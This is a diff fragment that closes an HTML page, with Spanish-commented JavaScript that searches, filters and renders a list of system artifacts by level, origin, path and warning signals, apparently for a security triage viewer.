+  // Al buscar se ignora el filtro de nivel: quien escribe "svchost" quiere
+  // encontrarlo este donde este, no solo entre los avisos.
+  const vis = DATOS.artefactos.filter(a => {
+    if (!q) return activos.has(a.nivel);
+    return (a.nombre+" "+a.comando+" "+(a.ruta||"")+" "+a.origen+" "+
+            a.senales.map(s=>s.titulo).join(" ")).toLowerCase().includes(q);
+  });
+  if (!vis.length) {
+    lista.innerHTML = '<div class="vacio">' +
+      (q ? 'Ningun artefacto coincide con «' + esc(q) + '».'
+         : 'Nada que mostrar con los filtros actuales.') + '</div>';
+    return;
+  }
+  if (q) {
+    const nota = document.createElement("div");
+    nota.className = "vacio"; nota.style.padding = "0 0 10px";
+    nota.textContent = vis.length + " coincidencias en todos los niveles";
+    lista.innerHTML = ""; lista.appendChild(nota);
+  } else { lista.innerHTML = ""; }
+  vis.forEach(a => {
+    const d = document.createElement("div");
+    d.className = "fila"; d.dataset.n = a.nivel;
+    d.innerHTML = `<div class="cabecera-fila">
+        <span class="pts">${a.puntos}</span>
+        <span class="origen">${esc(a.origen)}</span>
+        <span class="nombre">${esc(a.nombre)}</span>
+        <span class="ruta">${esc(a.ruta||a.comando)}</span>
+      </div><div class="cuerpo">${detalle(a)}</div>`;
+    d.querySelector(".cabecera-fila").onclick = () => d.classList.toggle("abierta");
+    lista.appendChild(d);
+  });
+}
+
+document.getElementById("buscar").addEventListener("input", pintar);
+tarjetas(); pintar();
+</script>
+</body>
+</html>
